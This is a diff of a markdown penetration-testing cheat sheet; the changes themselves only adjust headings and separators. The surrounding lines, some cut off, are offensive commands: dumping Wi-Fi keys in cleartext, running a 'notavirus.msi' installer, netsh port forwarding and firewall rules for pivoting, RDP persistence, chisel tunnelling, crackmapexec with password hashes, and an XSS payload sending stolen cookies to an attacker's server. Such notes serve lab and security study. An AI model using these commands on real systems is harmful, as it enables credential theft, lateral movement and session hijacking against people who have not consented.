@@ -77,8 +77,6 @@ Searching in ***Windows*** using the `dir` co>
 - `dir \ /s | find "i" | more` the above comm>
 - `dir /s /a:hs /q C:\Windows > myfile.txt` r>
 
----
-
 ### 📶🔓 WiFi Passwords in Cleartext (Win) — Because Windows whispers secrets if you ask nicely.
 
 - `netsh show profile "wifi network name" key=clear` 
@@ -98,8 +96,6 @@ msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"
 - `netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.11 connectport=445 connectaddress=192.168.10.1`
 - `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<local IP> localport=4455 action=allow`
 - verify: `netstat -anp TCP | find "4455"`
-
----
 
 ### 🪟🔁 Persistence via RDP — PowerShell, registry, and remote regrets.
 
@@ -197,17 +193,13 @@ Don't forget to add it to your proxychains.conf
 Also to make sure you are connecting to the right server
 `./chisel client --fingerprint <chisel server>`
 
----
-
-## 🔐🔥 crackmapexec
+🔐🔥 crackmapexec
 
 - `crackmapexec -t 20 smb --shares <target> ->
 - `crackmapexec winrm <target IP> -u users -H>
 - `crackmapexec smb -u '' -p '' -d <domain> .>
 
----
-
-## 🌐💨 curl — Because who needs a browser anyway?
+🌐💨 curl — Because who needs a browser anyway?
 
 You can do some great things with ***curl***,>
 
@@ -347,7 +339,7 @@ If the target is vulnerable for the get request (see above) we can get a shell o
 
 ## 🍪 Cookie stealing
 
-- `<script>new Image().src="http://<python3 h>
+- `<script>new Image().src="http://<python3 h>`
 
 ---
 
@@ -356,7 +348,7 @@ If the target is vulnerable for the get request (see above) we can get a shell o
 Whether you’re in a lab, a VM, or a Raspberry Pi taped behind your router.
 This section would be too extensive, use the documentation or help menu, but because I'm nice, passing on a few docker-fu commands.
 
-## 🐳⚙️ Docker — Because setting up an OS should only take 3 seconds.
+🐳⚙️ Docker — Because setting up an OS should only take 3 seconds.
 
 - test if it's working: `docker run hello-world`
 - `docker run --help` - to list all flags this command supports
@@ -372,8 +364,6 @@ This section would be too extensive, use the documentation or help menu, but bec
 - `docker image list` - list all pulled images
 - `docker rmi <image ID>` - from the above command get image ID and this command will delete the pulled image
 - `docker network ls` - lists Docker images running on network
-
-```
 
 ---
 
